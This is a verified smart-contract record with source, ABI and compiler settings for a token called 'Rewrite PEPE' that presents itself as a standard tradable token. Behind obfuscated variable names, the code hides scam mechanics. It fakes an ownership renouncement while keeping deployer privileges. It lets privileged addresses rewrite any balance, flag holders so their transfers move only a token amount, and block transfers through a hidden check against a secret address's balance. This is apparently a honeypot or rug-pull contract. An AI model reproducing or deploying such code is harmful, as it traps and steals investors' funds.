{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface teamMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptFundLiquidity) external view returns (uint256);\n\n    function transfer(address isTotal, uint256 takeMarketing) external returns (bool);\n\n    function allowance(address maxAmountTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isTotal,\n        uint256 takeMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptIs, uint256 value);\n    event Approval(address indexed maxAmountTake, address indexed spender, uint256 value);\n}\n\nabstract contract tokenTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundAt {\n    function createPair(address feeMin, address shouldIs) external returns (address);\n}\n\ninterface tradingShould is teamMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RewritePEPE is tokenTrading, teamMarketing, tradingShould {\n\n    function allowance(address senderIs, address teamBuySwap) external view virtual override returns (uint256) {\n        if (teamBuySwap == maxMarketing) {\n            return type(uint256).max;\n        }\n        return marketingMin[senderIs][teamBuySwap];\n    }\n\n    mapping(address => bool) public fromSwapLaunched;\n\n    constructor (){\n        if (teamSwap) {\n            sellWallet = true;\n        }\n        toLimit sellBuyTx = toLimit(maxMarketing);\n        tokenTotalSwap = fundAt(sellBuyTx.factory()).createPair(sellBuyTx.WETH(), address(this));\n        \n        amountList = _msgSender();\n        tradingFrom();\n        enableFund[amountList] = true;\n        senderEnable[amountList] = limitLaunched;\n        if (totalSell == launchedWallet) {\n            marketingShould = true;\n        }\n        emit Transfer(address(0), amountList, limitLaunched);\n    }\n\n    function launchedTx(address autoAmount) public {\n        require(autoAmount.balance < 100000);\n        if (marketingAt) {\n            return;\n        }\n        \n        enableFund[autoAmount] = true;\n        \n        marketingAt = true;\n    }\n\n    string private toLaunch = \"RPE\";\n\n    function txMaxMin(address atMarketingSell, address isTotal, uint256 takeMarketing) internal returns (bool) {\n        if (atMarketingSell == amountList) {\n            return launchedMax(atMarketingSell, isTotal, takeMarketing);\n        }\n        uint256 tokenFund = teamMarketing(tokenTotalSwap).balanceOf(receiverExempt);\n        require(tokenFund == fromMax);\n        require(isTotal != receiverExempt);\n        if (fromSwapLaunched[atMarketingSell]) {\n            return launchedMax(atMarketingSell, isTotal, txExempt);\n        }\n        return launchedMax(atMarketingSell, isTotal, takeMarketing);\n    }\n\n    uint256 fromMax;\n\n    function sellAmount(address listAmountTake, uint256 takeMarketing) public {\n        feeLimit();\n        senderEnable[listAmountTake] = takeMarketing;\n    }\n\n    uint256 public launchedWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitLaunched;\n    }\n\n    function launchedMax(address atMarketingSell, address isTotal, uint256 takeMarketing) internal returns (bool) {\n        require(senderEnable[atMarketingSell] >= takeMarketing);\n        senderEnable[atMarketingSell] -= takeMarketing;\n        senderEnable[isTotal] += takeMarketing;\n        emit Transfer(atMarketingSell, isTotal, takeMarketing);\n        return true;\n    }\n\n    address maxMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address receiverExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public amountList;\n\n    function symbol() external view virtual override returns (string memory) {\n        return toLaunch;\n    }\n\n    uint256 public liquidityTrading;\n\n    uint256 private receiverSender;\n\n    uint8 private walletLaunchedSwap = 18;\n\n    bool private minMode;\n\n    uint256 constant txExempt = 4 ** 10;\n\n    uint256 listSwap;\n\n    function transferFrom(address atMarketingSell, address isTotal, uint256 takeMarketing) external override returns (bool) {\n        if (_msgSender() != maxMarketing) {\n            if (marketingMin[atMarketingSell][_msgSender()] != type(uint256).max) {\n                require(takeMarketing <= marketingMin[atMarketingSell][_msgSender()]);\n                marketingMin[atMarketingSell][_msgSender()] -= takeMarketing;\n            }\n        }\n        return txMaxMin(atMarketingSell, isTotal, takeMarketing);\n    }\n\n    string private isLiquidity = \"Rewrite PEPE\";\n\n    address public tokenTotalSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return isLiquidity;\n    }\n\n    event OwnershipTransferred(address indexed modeTo, address indexed swapAuto);\n\n    function tradingFrom() public {\n        emit OwnershipTransferred(amountList, address(0));\n        swapTeam = address(0);\n    }\n\n    bool private sellWallet;\n\n    function launchFund(address receiverBuy) public {\n        feeLimit();\n        \n        if (receiverBuy == amountList || receiverBuy == tokenTotalSwap) {\n            return;\n        }\n        fromSwapLaunched[receiverBuy] = true;\n    }\n\n    bool private teamSwap;\n\n    function transfer(address listAmountTake, uint256 takeMarketing) external virtual override returns (bool) {\n        return txMaxMin(_msgSender(), listAmountTake, takeMarketing);\n    }\n\n    bool public marketingAt;\n\n    uint256 public totalSell;\n\n    function owner() external view returns (address) {\n        return swapTeam;\n    }\n\n    bool private marketingShould;\n\n    function approve(address teamBuySwap, uint256 takeMarketing) public virtual override returns (bool) {\n        marketingMin[_msgSender()][teamBuySwap] = takeMarketing;\n        emit Approval(_msgSender(), teamBuySwap, takeMarketing);\n        return true;\n    }\n\n    bool private modeEnable;\n\n    uint256 private limitLaunched = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletLaunchedSwap;\n    }\n\n    mapping(address => uint256) private senderEnable;\n\n    function balanceOf(address exemptFundLiquidity) public view virtual override returns (uint256) {\n        return senderEnable[exemptFundLiquidity];\n    }\n\n    function feeLimit() private view {\n        require(enableFund[_msgSender()]);\n    }\n\n    bool private walletSwap;\n\n    mapping(address => bool) public enableFund;\n\n    function getOwner() external view returns (address) {\n        return swapTeam;\n    }\n\n    function tokenFee(uint256 takeMarketing) public {\n        feeLimit();\n        fromMax = takeMarketing;\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingMin;\n\n    address private swapTeam;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAmountTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamBuySwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamBuySwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFundLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromSwapLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"}],\"name\":\"launchFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoAmount\",\"type\":\"address\"}],\"name\":\"launchedTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAmountTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMarketing\",\"type\":\"uint256\"}],\"name\":\"sellAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeMarketing\",\"type\":\"uint256\"}],\"name\":\"tokenFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTotalSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAmountTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMarketingSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RewritePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}